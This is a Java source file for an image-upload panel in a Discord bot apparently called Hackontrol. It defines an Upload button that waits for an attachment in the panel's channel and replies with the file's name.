package com.khopan.hackontrol.panel;

import java.util.List;

import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.Message.Attachment;
import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class ImagePanel extends Panel {
	private static final String PANEL_NAME = "image";

	private static final Button BUTTON_UPLOAD = ButtonManager.staticButton(ButtonType.SUCCESS, "Upload", "imageUpload");

	private boolean uploading;
	private long uploadMessage;

	@Override
	public String panelName() {
		return ImagePanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, ImagePanel.BUTTON_UPLOAD, context -> {
			if(!this.uploading) {
				this.uploadMessage = context.reply("**Waiting for an image...**").complete().retrieveOriginal().complete().getIdLong();
				this.uploading = true;
				return;
			}

			this.uploading = false;
			context.getChannel().deleteMessageById(this.uploadMessage).queue();
			HackontrolMessage.boldDeletable(context.reply(), "Uploading canceled");
		});

		this.register(Registration.MESSAGE_RECEIVED_EVENT, Event -> {
			MessageChannelUnion channel = Event.getChannel();

			if(channel.getIdLong() != this.channel.getIdLong()) {
				return;
			}

			List<Attachment> attachmentList = Event.getMessage().getAttachments();

			if(attachmentList.isEmpty()) {
				return;
			}

			channel.deleteMessageById(this.uploadMessage).queue();
			Attachment attachment = attachmentList.get(0);
			HackontrolMessage.boldDeletable(MessageChannelSendable.of(channel), "Attachment: " + attachment.getFileName());
		});
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(ImagePanel.BUTTON_UPLOAD)
				.build()
		};
	}
}
